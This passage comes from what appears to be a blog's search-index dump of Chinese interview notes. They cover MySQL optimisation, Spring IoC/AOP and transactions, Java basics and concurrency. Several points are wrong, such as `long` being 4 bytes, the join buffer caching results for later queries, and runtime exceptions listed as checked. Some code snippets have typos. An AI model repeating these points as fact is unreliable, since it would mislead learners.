IN()或者like等运算符的查询中。SELECT * FROM tbl_name WHERE key_column BETWEEN 10 and 20;SELECT * FROM tbl_name WHERE key_column IN (10,20,30);11、index索引全表扫描，把索引从头到尾扫一遍。这里包含两种情况：一种是查询使用了覆盖索引，那么它只需要扫描索引就可以获得数据，这个效率要比全表扫描要快，因为索引通常比数据表小，而且还能避免二次查询。在extra中显示Using index，反之，如果在索引上进行全表扫描，没有Using index的提示。 SQL的优化方式有哪些，优化方式可能根据业务 索引，在where或者需要orderby的字段使用索引，来避免扫全表 Union创建临时表，或者创建view在业务中临时使用 创建联合索引 还有网上说的是join代替嵌套子查询，但是分布式，微服务场景下查的时候，可能就有些分库分表场景下的优化方式就不好说了 常用的方法是用索引单表查完之后在业务里做filter，merge之类的操作 如果仅用join，有俩原则，一个是小表驱动大表去连接，另外是on的字段要建上个索引；如果还是出现瓶颈的话，就调大join的buffersize join buffer的底层join buffer将参与join操作中的两个或者多个表数据缓存在内存中，以便在下一次进行相同的查询时可以直接从缓存中获取数据，而不必访问磁盘或索引。这样可以大大提高查询速度。 索引的优化方式有哪些？ 在合适的列上建立索引，1.唯一性2经常用于where或者orderby的 3.可比较的 为什么有时候使用索引反而会降低性能 联合索引不满足最左覆盖的时候，索引失效，退化成全表扫描 索引碎片的东西，比如说如果建在经常修改删除的字段，可能产生不连续的区域，增加IO的压力 索引就失效了⁴。这时候MySQL就会退化为全表扫描，而不是利用索引进行快速定位 MYSQL 如果发现CPU，或者IO压力很大，怎么定位问题1、首先用htop命令和iostat命令，定位是什么进程在占用cpu和磁盘io2、sql执行show full processlist命令，看现在数据库在执行什么sql语句，是否有语句长时间执行使数据库卡住3、执行show innodb engine status命令，查看数据库是否有锁资源争用4、查看mysql慢查询日志/slow_query.log文件，看是否有慢sql5、找到引起数据库占用资源高的语句，进行优化，该建索引的建索引，索引不合适的删索引，或者根据情况kill掉耗费资源的sql语句等 大表要如何优化 分区表：使用分区表将大表拆分为更小的、易管理的分区。根据数据的时间范围、地理位置等因素进行分区，可以提高查询性能和维护效率。 垂直切分：将大表按列进行垂直切分，将一部分列存储在一个表中，将其他列存储在另一个表中。这可以提高热数据的读取效率。 水平切分（分库分表），mysql分布式存到不同节点上。将大表数据水平切分成多个小表，每个小表存储部分数据。这样可以提高并发性能，使查询分散在不同的数据节点上。Redis Lua常用的命令 EVAL：EVAL script numkeys key [key …] arg [arg …] EVALSHA：EVALSHA sha1 numkeys key [key …] arg [arg …]SCRIPT LOAD命令格式：SCRIPT LOAD scriptEVALSHA命令格式： 这两个命令放在一起讲的原因是：EVALSHA 命令中的sha1参数，就是SCRIPT LOAD 命令执行的结果。 SCRIPT LOAD SCRIPT EXISTS SCRIPT FLUSH SCRIPT KILL 本地缓存如何选型 ConcurrentHashMap golang的话，本地一级缓存和一用","categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://waynamigo.github.io/categories/MySQL/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Git","slug":"Git","permalink":"http://waynamigo.github.io/tags/Git/"},{"name":"MySQL","slug":"MySQL","permalink":"http://waynamigo.github.io/tags/MySQL/"}]},{"title":"Java collection","slug":"2023-01-10-面经JavaSpring","date":"2023-01-09T16:00:00.000Z","updated":"2023-11-19T12:38:36.788Z","comments":true,"path":"2023/01/10/2023-01-10-面经JavaSpring/","link":"","permalink":"http://waynamigo.github.io/2023/01/10/2023-01-10-面经JavaSpring/","excerpt":"ok","text":"ok MVC Ioc，控制反转，将对象的创建和控制权交给spring，Ioc容器 AOP的直接体现就是注解 AOP和IOC的理解 AOP面向切面编程，起到了解耦的作用，完成一个日志/事务/权限处理等不属于业务里的功能，不需要更改过多业务代码，而是通过一个AOP动态代理（JDK/GClib）完成，调用时将公共逻辑添加到项目中 IOC，控制反转+依赖注入，通过IOC容器控制对象/对象的依赖 的创建，反转是用IOC容器创建后注入到对象中，由主动创建变成了被动创建 IOC底层实现过程：核心原理是反射，使用BeanFactory的工厂模式实现的 createBeanfactory创建bean工厂 循环创建对象，先通过getBean，doGetBean从容器中查找，没有的话去createBean，doGreateBean，以反射的方法创建对象 进行对象的属性填充populateBean和进行其他初始化initializingBeanBean的生命周期 反射的方式实例化Bean 对象属性用populateBean填充，循环依赖使用三级缓存 invokeAwareMethod，设置相关依赖：BeanName BeanFactory BeanClassloader 调用BeanPostProcessor()前置处理方法，ApplicationContextPostPostProcessor，设置上下文，环境，resourceloader等对象 调用invokeInitmethod()，判断是否实现initializingBean，调用了就再调用afterpropertiesSet方法 调用BeanPostProcessor的后置处理方法，AOP在该过程实现，AbstractAutoProxyCreator()，advice切面切点 获取完整的对象，可以用getbean获取了 执行完后，销毁流程，先判断是否实现DisposableBean接口，再判断是否实现DestroyMethod接口 循环依赖怎么解决？【使用了三级缓存】使用了三级缓存，AOP，提前暴露对象 问题：对象循环依赖产生的问题，A依赖B，B依赖A，提前暴露对象导致的 Bean创建流程是先实例化，再进行属性填充初始化 A如果属性里有B，在填充时需要从IOC容器里查找B，找不到的话，就创建B；然后B在属性填充的时候查找A，但是A没有创建完毕， 一级缓存中放的是完整对象，二级是没有完全创建的对象 第三级为什么需要？第三级缓存的value类型是ObjectFactory类型的函数接口，保证在整个容器的作用域中只有一个版本的同名Bean对象。 创建bean对象后，要放到三级缓存中是用于先判断是否需要被代理，选择取的是普通对象还是代理对象。 如果一个对象需要被代理，需不需要先实例化一个普通对象（要，必须传参数给wrapifnecessary）普通对象和代理对象不能同时出现在容器中，当需要被代理时，就需要覆盖普通对象 SpringAOP的底层原理底层原理就是使用的jvm或者gclibs的动态代理功能。AOP的实现阶段是IOC的BeanPostProcessor的后置方法中实现的扩展功能。 介绍一下jvm gclib的原理，反射 Spring的设计模式 Bean都是单例模式 工厂模式，BeanFactory 观察者模式，Listener，Event 适配器模式，Adapter 装饰者模式：Bean的Wrapper 责任链模式：使用AOP时，先生成一个拦截器 代理模式：AOP使用的动态代理事务Spring事务如何实现的，如何回滚答：事务是AOP实现的声明式事务。也就是首先要生成具体的代理对象，按AOP的流程来执行具体操作逻辑。12@Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT, readOnly = false, timeout = -1) 底层具体到代码里是用jdbc的datasourceTransactionManager实现的，注解声明的事务逻辑是通过一个TransationInterceptor类实现，调用invoke函数体里，最后返回一个invokewithtransaction实现具体逻辑（对传参的方法使用getmethod获取） 回滚的方式如下： 执行失败使用completeTransactionAfterthrowing 执行成功用completeTransactionAfterreturning 执行失败的回滚在transactional的doRollback里实现,里面是先获取object.getconn连接，然后conn.rollback回滚，只对于这个特定连接进行，而不是全局的。 执行成功的提交在transactional里的doCommit，也是获取连接，用jdbc连接的conn.commit()方法提交。 最后cleanTransactionInfo清除当前事务信息 SpringBoot的优点 独立运行Spring Boot 而且内嵌了各种 servlet 容器，Tomcat、Jetty 等，现在不再需要打成war 包部署到容器中，Spring Boot 只要打成一个可执行的 jar 包就能独立运行，所有的依赖包都在一个 jar 包内。 简化配置spring-boot-starter-web 启动器自动依赖其他组件，简少了 maven 的配置。 自动配置Spring Boot 能根据当前类路径下的类、jar 包来自动配置 bean，如添加一个 springboot-starter-web 启动器就能拥有 web 的功能，无需其他配置。 无代码生成和XML配置Spring Boot 配置过程中无代码生成，也无需 XML 配置文件就能完成所有配置工作，这一切都是借助于条件注解完成的，这也是 Spring4.x 的核心功能之一。 应用监控Spring Boot 提供一系列端点可以监控服务及应用，做健康检测Spring Bean被Ioc容器管理的对象，通过xml或者Entity等注解 org.springframework.beans org.springframework.context @Component：通用的注解，可标注任意类为 Spring 组件。如果一个 Bean 不知道属于哪个层，可以使用@Component 注解标注。 @Repository : 对应持久层即 Dao 层，主要用于数据库相关操作。 @Service : 对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao 层。 @Controller : 对应 Spring MVC 控制层，主要用于接受用户请求并调用 Service 层返回数据给前端页面 1. @Bean和@Component的区别 bean用于方法，component用于注解 @Component通常是通过类路径扫描来自动侦测以及自动装配到 Spring 容器中（我们可以使用 @ComponentScan 注解定义要扫描的路径从中找出标识了需要装配的类自动装配到 Spring 的 bean 容器中）。 @Bean注解通常是我们在标有该注解的方法中定义产生这个 bean,@Bean告诉了 Spring 这是某个类的实例，当我需要用它的时候还给我2. 可以注入Bean的注解有哪些 @Autowired @Resource Spring事务Spring 管理事务的方式有几种？ 编程式事务：在代码中硬编码(不推荐使用) : 通过 TransactionTemplate或者 TransactionManager 手动管理事务，实际应用中很少使用，但是对于你理解 Spring 事务管理原理有帮助。 声明式事务：在 XML 配置文件中配置或者直接基于注解（推荐使用） : 实际是通过 AOP 实现（基于@Transactional 的全注解方式使用最多） 1. @Transactional使用场景：hibernate的删除事务，更新事务 使用@Transactional(rollbackFor = Exception.class)： 用于保证事务一致性，发生异常时回滚 不配置for exception的话，只有在runtime err时回滚，为了保证可靠性 SpringBoot 从常用注解和生命周期，启动，监控，测试等考察 是@Configuration、@EnableAutoConfiguration、@ComponentScan的集合体 1. @SpringBootApplication自动装配原理是什么？ @EnableAutoConfiguration：启用 SpringBoot 的自动配置机制 @Configuration：允许在上下文中注册额外的 bean 或导入其他配置类 @ComponentScan：扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描启动类所在的包下所有的类 ，可以自定义不扫描某些 bean。 2. 常用注解： @RestController和@Controller指定一个类，作为控制器的注解 @RequestMapping方法级别的映射注解，这一个用过Spring MVC的小伙伴相信都很熟悉 @EnableAutoConfiguration和@SpringBootApplication是类级别的注解，根据maven依赖的jar来自动猜测完成正确的spring的对应配置，只要引入了spring-boot-starter-web的依赖，默认会自动配置Spring MVC和tomcat容器 @Configuration类级别的注解，一般这个注解，我们用来标识main方法所在的类,完成元数据bean的初始化。 @ComponentScan类级别的注解，自动扫描加载所有的Spring组件包括Bean注入，一般用在main方法所在的类上 @ImportResource类级别注解，当我们必须使用一个xml的配置时，使用@ImportResource和@Configuration来标识这个文件资源的类。 @Autowired注解，一般结合@ComponentScan注解，来自动注入一个Service或Dao级别的Bean @Component类级别注解，用来标识一个组件，比如我自定了一个filter，则需要此注解标识之后，Spring Boot才会正确识别。 面试问题1.BeanFactory2.常用注解","categories":[{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/categories/Java/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/tags/Java/"}]},{"title":"Java base","slug":"2023-01-10-面经Java基础","date":"2023-01-09T16:00:00.000Z","updated":"2023-10-30T17:25:40.272Z","comments":true,"path":"2023/01/10/2023-01-10-面经Java基础/","link":"","permalink":"http://waynamigo.github.io/2023/01/10/2023-01-10-面经Java基础/","excerpt":"ok","text":"ok 原则：只能将一个类的实例赋值给它本身或者它的子类，而不能将一个父类的实例赋值给一个子类的引用123B extends A;B b = new A(); //错误A a = new B(); //合法，但是通过 a 只能访问 A 类中定义的方法和属性，除非 B 类重写了这些方法 关键字基本类型 boolean 1 byte 1 short 2 char 2 int 4 float 4 long 4 double 包装类型 Boolean Byte Short Character Integer Long Float（没有实现缓存机制） Double（没有实现缓存机制） BigDecimal（浮点精确运算的场景，传统浮点类型计算时，会出现位数不够的时候，计算机会给这个浮点表示进行截断），计算机x86一般用小端存储，高（位）存高（地址），低存低 低地址：指的是内存中较小的地址值。在大多数系统中，低地址对应于内存中的起始位置，也就是地址为0的位置。 高地址：指的是内存中较大的地址值。它是相对于低地址而言的，表示内存的结束位置。 BigInteger（存储超过64 位 long 整型的数字）BigInteger 内部使用 int[] 数组来存储任意大小的整形数据。 https://javaguide.cn/java/basis/bigdecimal.html 装箱 123456789101112131415Integer num1 = 40; //发生装箱，相当于 Integer.valueOf(40);Integer num2 = new Integer(40);return num1 == num2; | return false; 解释：num1 直接使用的是缓存中的对象: num2 直接创建了新对象// 自动装箱函数public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125;// 自动拆箱如果把第一句换成 int num1 =40;num1 == num2;| return true; //会对num2发生自动拆箱，会实现两个int类型的比较，返回true// 如果要用num2.equals比较:num2.equals(Integer.valueOf(num1)); 所有整型包装类对象之间值的比较，全部使用 equals 方法比较。 == 操作符会比较两个对象的引用是否相等，而不是它们的值。因为 num1 和 num2 都是通过自动装箱得到的，它们实际上是不同的对象，即使它们包装的值相同 自动拆箱与装箱的例子： Integer i = 10 等价于 Integer i = Integer.valueOf(10) int n = i 等价于 int n = i.intValue(); 如果频繁拆装箱的话，也会严重影响系统的性能。我们应该尽量避免不必要的拆装箱操作。访问控制 private protected public类，方法，变量修饰符 class new abstract extends static: final implements interface synchronized enum native volatile static:static 修饰的变量和方法可以被类的所有实例共享，无论一个类创建了多少个对象，它们都共享同一份静态变量。也就是说，静态变量只会被分配一次内存，即使创建多个对象，这样可以节省内存。 静态方法只允许访问静态成员（即静态成员变量和静态方法），不允许访问实例成员（即实例成员变量和实例方法），而实例方法不存在这个限制。 【为什么不能调用非静态成员】：在类加载的时候就会分配内存，非静态成员需要实例化后才能有效访问 错误处理 try catch throw throws finally 当在 try 块或 catch 块中遇到 return 语句时，finally 语句块将在方法返回之前被执行。 重写 override 和 重载 overload override是子类重写父类方法，参数需要一样 overload是在一个类中重载的某个方法 构造方法可以背重载，不可以重写 接口和抽象类有什么共同点和区别？共同点：都不能被实例化。都可以包含抽象方法。都可以有默认实现的方法（Java 8 可以用 default 关键字在接口中定义默认方法）。 区别：接口主要用于对类的行为进行约束，你实现了某个接口就具有了对应的行为。抽象类主要用于代码复用，强调的是所属关系。一个类只能继承一个类，但是可以实现多个接口。接口中的成员变量只能是 public static final 类型的，不能被修改且必须有初始值，而抽象类的成员变量默认 default，可在子类中被重新定义，也可被重新赋值 深拷贝与浅拷贝/引用拷贝 深拷贝：完整复制某个对象，包括这个对象中的内部对象，都是不同的对象 浅拷贝：在堆上创建一个新对象，这个新对象与原对象使用的是同一个内部对象1234567891011@Overridepublic Person clone() &#123; try &#123; Person person = (Person) super.clone(); person.setAddress(person.getAddress().clone()); //加入这一行，内部的address对象也进行拷贝，本质上是堆上的另外一个对象。 return person; &#125; catch (CloneNotSupportedException e) &#123; throw new AssertionError(); &#125;&#125; Object：基类12345678910111213141516171819202122//native 方法，用于返回当前运行时对象的 Class 对象，使用了 final 关键字修饰，故不允许子类重写。public final native Class&lt;?&gt; getClass()//native 方法，用于返回对象的哈希码，主要使用在哈希表中，比如 JDK 中的HashMap。获取哈希码（int 整数），也称为散列码，也可以比较两个对象是否相等。两个对象的hashCode 值相等并不代表两个对象就相等：可能发生冲突public native int hashCode()//用于比较 2 个对象的内存地址是否相等，String 类对该方法进行了重写以用于比较字符串的值是否相等。public boolean equals(Object obj)//native 方法，用于创建并返回当前对象的一份拷贝。protected native Object clone() throws CloneNotSupportedException//返回类的名字实例的哈希码的 16 进制的字符串。建议 Object 所有的子类都重写这个方法。public String toString()//native 方法，并且不能重写。唤醒一个在此对象监视器上等待的线程(监视器相当于就是锁的概念)。如果有多个线程在等待只会任意唤醒一个。public final native void notify()//native 方法，并且不能重写。跟 notify 一样，唯一的区别就是会唤醒在此对象监视器上等待的所有线程，而不是一个线程。public final native void notifyAll()//native方法，并且不能重写。暂停线程的执行。注意：sleep 方法没有释放锁，而 wait 方法释放了锁 ，timeout 是等待时间。public final native void wait(long timeout) throws InterruptedException//多了 nanos 参数，这个参数表示额外时间（以纳秒为单位，范围是 0-999999）。 所以超时的时间还需要加上 nanos 纳秒。。public final void wait(long timeout, int nanos) throws InterruptedException//跟之前的2个wait方法一样，只不过该方法一直等待，没有超时时间这个概念public final void wait() throws InterruptedException//实例被垃圾回收器回收的时候触发的操作protected void finalize() throws Throwable &#123; &#125; String StringBuffer StringBuilder String类不可变：创建时，采用final的字符数组表示字符串了,final char [],(java9以后用的byte[]) StringBuilder 与 StringBuffer都继承自 AbstractStringBuilder 类，也是使用字符数组保存字符串，不过没有使用 final 和 private 关键字修饰，最关键的是这个 AbstractStringBuilder 类还提供了很多修改字符串的方法比如 append 方法。 字符串常量池是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。 123456// 在堆中创建字符串对象”ab“// 将字符串对象”ab“的引用保存在字符串常量池中String aa = \"ab\";// 直接返回字符串常量池中字符串对象”ab“的引用String bb = \"ab\";System.out.println(aa==bb);// true 【面试题】String s1 = new String(&quot;abc&quot;);这句话创建了几个字符串对象？ 一个或两个： 一个的情况，abc在字符串常量池里，仅需要abc的引用创建s1 两个的情况，abc不存在常量池里，要先创建abc，再将其引用创建s1 【面试题】手动将某字符串加入字符串常量池用什么方法 String.intern() 将指定的字符串对象的引用保存在字符串常量池中，可以简单分为两种情况： 如果字符串常量池中保存了对应的字符串对象的引用，就直接返回该引用。123456789101112131415// 在堆中创建字符串对象”Java“// 将字符串对象”Java“的引用保存在字符串常量池中String s1 = \"Java\";// 直接返回字符串常量池中字符串对象”Java“对应的引用String s2 = s1.intern();// 会在堆中在单独创建一个字符串对象String s3 = new String(\"Java\");// 直接返回字符串常量池中字符串对象”Java“对应的引用String s4 = s3.intern();// s1 和 s2 指向的是堆中的同一个对象System.out.println(s1 == s2); // true// s3 和 s4 指向的是堆中不同的对象System.out.println(s3 == s4); // false// s1 和 s4 指向的是堆中的同一个对象System.out.println(s1 == s4); //true 【面试题】字符串加号操作 str + str 12345678String str1 = \"str\";//创建了一个字符串常量 \"str\"，它会存储在常量池中String str2 = \"ing\";String str3 = \"str\" + \"ing\";//这里的 \"str\" 和 \"ing\" 都是字符串字面量，它们会在编译时就被合并成一个新的字符串常量 \"string\"，然后存储在常量池中。String str4 = str1 + str2;//这里使用了变量 str1 和 str2 进行字符串拼接，这是在运行时进行的。因此，新的字符串对象 \"string\" 会在堆内存中创建，而不是常量池String str5 = \"string\";System.out.println(str3 == str4);//falseSystem.out.println(str3 == str5);//trueSystem.out.println(str4 == str5);//false Exception 和 Error（两者继承Thorwable） Exception ：程序本身可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 Checked Exception (受检查异常，必须处理) 和 Unchecked Exception (不受检查异常，可以不处理)。 Error：Error 属于程序无法处理的错误 ，jvm一般会选择线程终止。例如 Java 虚拟机运行错误（Virtual MachineError）、虚拟机内存不够错误(OutOfMemoryError)、类定义错误（NoClassDefFoundError）等 。这些异常发生时，Java 虚拟机（JVM）一般会选择线程终止。 Checkable Exception 受检查异常，必须用catch或者throw捕获除了RuntimeException及其子类以外（下列），其他的Exception类及其子类都属于受检查异常 NullPointerException(空指针错误) IllegalArgumentException(参数错误比如方法入参类型错误) NumberFormatException（字符串转换为数字格式错误，IllegalArgumentException的子类） ArrayIndexOutOfBoundsException（数组越界错误） ClassCastException（类型转换错误） ArithmeticException（算术错误） SecurityException （安全错误比如权限不够） UnsupportedOperationException(不支持的操作错误比如重复创建同一用户) 12345678910111213141516171819202122public class A &#123; // 使用throws关键字声明可能抛出异常 public void doSomething() throws MyException &#123; // 在方法内部发现异常情况 if (/* some condition */) &#123; // 抛出自定义异常 throw new MyException(\"Something went wrong\"); &#125; &#125; public void doSomething()&#123; try&#123; &#125;catch(MyException e)&#123; e.printStackTrace(); //在控制台上打印 Throwable 对象封装的异常信息 e.getMessage();// 返回异常发生时的简要描述 e.toString();// 返回异常发生时的详细信息 e.getLocalizedMessage();//返回异常对象的本地化信息。 &#125;finally&#123; &#125; &#125;&#125; 泛型 Generics //对比CPP的template相同点： 参数化类型：两者都允许你定义可以接受不特定类型的数据结构或算法，从而提高代码的复用性和灵活性。 类型安全：Java 的泛型和 C++ 的模板都在编译时进行类型检查，确保类型的一致性。 支持容器类：在两者中，可以创建可以容纳任何类型的容器类（例如，List、Set、Map 等）。 不同点： 实现方式： Java 泛型是通过擦除（type erasure）来实现的。在编译时，泛型类型信息会被擦除，编译器会将泛型代码转化成非泛型的代码。这意味着在运行时，不会保留关于泛型类型的信息。这也是为什么在 Java 中不能直接创建泛型数组的原因。 C++ 模板是通过编译器在编译时进行代码生成，每次使用模板时，都会根据模板参数生成对应的代码。这使得 C++ 模板可以实现更为复杂和灵活的类型推断。 语法：Java 泛型使用来表示泛型类型，可以在类、接口、方法等级别使用泛型。C++ 模板使用或者来声明模板参数，可以在类、函数等级别使用模板。 泛型的通配符：Java 的泛型可以使用通配符（wildcards）来表示不确定的类型。例如：List&lt;?&gt;表示一个不确定类型的 List。C++ 模板可以通过模板特化来处理特定的类型。 模板元编程：C++ 的模板系统支持模板元编程，这意味着可以在编译时进行计算和逻辑操作，从而实现更为复杂的类型处理。 依赖：Java 的泛型不依赖于运行时类型信息（RTTI）。C++ 的模板依赖于编译时类型信息（CTTI）。 反射机制 代理机制 使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。 动态代理更加灵活，不需要必须实现接口，可以直接代理实现类，并且可以不需要针对每个目标类都创建一个代理类。 静态代理中，接口一旦新增加方法，目标对象和代理对象都要进行修改，这是非常麻烦的！ JVM 层面：静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。而动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。 1234567Class alunbarClass = TargetObject.class; //知道目的类名为TargetObject，直接获取Class alunbarClass1 = Class.forName(\"cn.javaguide.TargetObject\");//通过类的全路径获取TargetObject instance = new TargetObject();//通过实例获取Class alunbarClass2 = instance.getClass();//通过类加载器进行全路径的loadclassClassLoader.getSystemClassLoader().loadClass(\"cn.javaguide.TargetObject\"); 静态代理可以在代理类中增加方法 12345678910111213141516public interface SmsService &#123; String send(String message);&#125;public class SmsServiceImpl implements SmsService &#123; public String send(String message) &#123; // ... &#125;&#125;public class SmsProxy implements SmsService &#123; private final SmsService smsService; public SmsProxy(SmsService smsService) &#123; this.smsService = smsService; &#125;&#125;SmsService smsService = new SmsServiceImpl();SmsProxy smsProxy = new SmsProxy(smsService); 动态代理：JDK 动态代理、CGLIB 动态代理 InvocationHandler 接口和 Proxy 类 还必须需要实现InvocationHandler 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用。123456public interface InvocationHandler &#123; //当你使用代理对象调用方法的时候实际会调用到这个方法 public Object invoke(Object proxy, Method method, Object[] args)&#123; throws Throwable; &#125;&#125; IO流数据从外部存储和内存之间进出的过程就是IO。 字节流如果我们不知道编码类型的话，使用字节流的过程中很容易出现乱码问题。 字符流字符流是由 Java 虚拟机将字节转换得到的，这个过程还算是比较耗时 序列化 Protobuf，Hessian，Kyro transient 阻止实例中那些用此关键字修饰的的变量序列化； 当对象被反序列化时，被 transient 修饰的变量值不会被持久化和恢复。 transient 只能修饰变量，不能修饰类和方法。 static 变量因为不属于任何对象(Object)，所以无论有没有 transient 关键字修饰，均不会被序列化。 sun.misc.Unsafe类:并发工具类的组件，一个直接操作内存空间的类。主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升 Java 运行效率、增强 Java 语言底层资源操作能力方面起到了很大的作用。 Unsafe中提供的方法需要依赖native方法，Java 代码中只是声明方法头，具体的实现则交给本地代码 堆外内存使用方法 12345678910//分配新的本地空间public native long allocateMemory(long bytes);//重新调整内存空间的大小public native long reallocateMemory(long address, long bytes);//将内存设置为指定值public native void setMemory(Object o, long offset, long bytes, byte value);//内存拷贝public native void copyMemory(Object srcBase, long srcOffset,Object destBase, long destOffset,long bytes);//清除内存public native void freeMemory(long address); 这种方式分配堆外内存，是无法进行垃圾回收的，需要我们把这些内存当做一种资源去手动调用freeMemory方法进行释放，否则会产生内存泄漏。通用的操作内存方式是在try中执行对内存的操作，最终在finally块中进行内存释放。 【面试题】为什么要用堆外内存 对GC停顿的改善。由于堆外内存是直接受操作系统管理而不是 JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在 GC 时减少回收停顿对于应用的影响。 提升程序 I/O 操作的性能。通常在 I/O 通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。 1234567891011// 单例模式的应用：// 利用反射获得 Unsafe 类中已经实例化完成的单例对象 theUnsafe.Unsafe unsafe = Unsafe.reflectGetUnsafe();try&#123; long maddr = unsafe.allocateMemory(1024);&#125;catch(OutOfMemoryError e)&#123; e.printStackTrace(); throw e;&#125;finally&#123; unsafe.freeMomory(maddr);&#125; DirectByteBuffer 实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，在NIO中使用广泛。 对于堆外内存的创建、使用、销毁等逻辑均由 Unsafe 提供的堆外内存 API 来实现 内存屏障 Memory Barrier:组织指令重排序阻止屏障两边的指令重排序从而避免编译器和硬件的不正确优化情况 屏蔽了操作系统底层的差异，允许在代码中定义、并统一由 JVM 来生成内存屏障指令，来实现内存屏障的功能123456//内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏障后，屏障后的load操作不能被重排序到屏障前public native void loadFence();//内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后，屏障后的store操作不能被重排序到屏障前public native void storeFence();//内存屏障，禁止load、store操作重排序public native void fullFence(); 运行中的线程不是直接读取主内存中的变量的，只能操作自己工作内存中的变量，然后同步到主内存中，并且线程的工作内存是不能共享的。上面的图中的流程就是子线程借助于主内存，将修改后的结果同步给了主线程，进而修改主线程中的工作空间，跳出循环。","categories":[{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/categories/Java/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/tags/Java/"}]},{"title":"Java concur","slug":"2023-01-10-面经Java并发","date":"2023-01-09T16:00:00.000Z","updated":"2023-10-30T17:25:39.556Z","comments":true,"path":"2023/01/10/2023-01-10-面经Java并发/","link":"","permalink":"http://waynamigo.github.io/2023/01/10/2023-01-10-面经Java并发/","excerpt":"ok","text":"ok java线程和linux的C++线程有何区别Java线程：Java中的异常处理机制可以捕获和处理线程中的异常。 C++线程：C++线程中的异常会导致程序终止，除非显式地进行了异常处理。 java线程多个线程共享进程的堆和方法区 (JDK1.8 之后的元空间)资源，但是每个线程有自己的程序计数器、虚拟机栈 和 本地方法栈。 程序计数器PC，需要按顺序实行机器指令；多线程情况下，相当于一个指针指向执行位置，恢复上下文 如果执行的是 native 方法，那么程序计数器记录的是 undefined 地址，只有执行的是 Java 代码时程序计数器记录的才是下一条指令的地址。 虚拟机栈和本地方法栈为什么私有 每个方法的栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程 本地方法栈则为虚拟机使用到的 Native 方法服务。 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。java线程的生命周期Java 线程在运行的生命周期中的指定时刻只可能处于下面 6 种不同状态的其中一个状态： NEW: 初始状态，线程被创建出来但没有被调用 start() 。 RUNNABLE: 运行状态，线程被调用了 start()等待运行的状态。 BLOCKED：阻塞状态，需要等待锁释放。 WAITING：等待状态，表示该线程需要等待其他线程做出一些特定动作（通知或中断）。 TIME_WAITING：超时等待状态，可以在指定的时间后自行返回而不是像 WAITING 那样一直等待。 TERMINATED：终止状态，表示该线程已经运行完毕。 线程死锁sleep() 方法和 wait() 方法对比 wait释放了锁，sleep没释放锁，所以wait会被用于线程间的同步，sleep常用于暂停程序 wait的线程不自动苏醒，需要同一对象的其他线程使用notify去唤醒，sleep的时间过完会自动往下执行 wait执行完释放了锁 sleep没有释放锁，可能导致死锁 wait() 通常被用于线程间交互/通信 sleep()通常被用于暂停执行。 wait() 方法被调用后，线程不会自动苏醒，需要别的线程调用同一个对象上的 notify()或者 notifyAll() 方法。 sleep()方法执行完成后，线程会自动苏醒，或者也可以使用 wait(long timeout) 超时后线程会自动苏醒。 sleep() 是 Thread 类的静态本地方法，wait() 则是 Object 类的本地方法。 为什么 wait() 方法不定义在 Thread 中 wait() 是让获得对象锁的线程实现等待，会自动释放当前线程占有的对象锁。 每个对象（Object）都拥有对象锁，既然要释放当前线程占有的对象锁并让其进入 WAITING 状态，自然是要操作对应的对象（Object）而非当前的线程（Thread）。为什么sleep方法定义在Thread中 sleep() 是让当前线程暂停执行，不涉及到对象类，也不需要获得对象锁。 【面试题】可以直接调用 Thread 类的 run 方法吗【回答】可以直接调用，但是直接执行 run() 方法，不经过start()时，jvm会把 run() 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它 调用 start() 方法方可启动线程并使线程进入就绪状态 直接执行 run() 方法的话不会以多线程的方式执行 Java内存模型共享内存：volatile声明变量共享，防止jvm指令重排 该变量可能会被多个线程同时访问 每次读区都从内存读，不会被本地线程缓存 可确保可见性和有序性，但不能保证原子性 这个变量在堆上还是在栈上？ 至于变量在哪里存储，volatile 关键字主要影响了变量的可见性，在堆还是栈上取决于它是成员变量还是局部变量禁止指令重排序：volatile一个jvm调优的办法，jvm会自动重排，有可能导致性能下降。unsafe类提供了直接操作内存的方法，volatile的变量在读写时，插入读写屏障来禁止指令重排123public native void loadFence();public native void storeFence();public native void fullFence(); 乐观锁悲观锁 乐观锁是线程无需等待，只在提交修改的时候验证资源是否被修改 悲观锁是显式的synchronized或者reentrantlock独占锁 CAS算法，java.util.concurrent.atomic包下面的原子变量类（比如AtomicInteger、LongAdder）就是使用了乐观锁的一种实现方式 CAS Compare And Swap（比较与交换）实现的。 区别：高并发场景下，乐观锁不会造成死锁或阻塞问题。 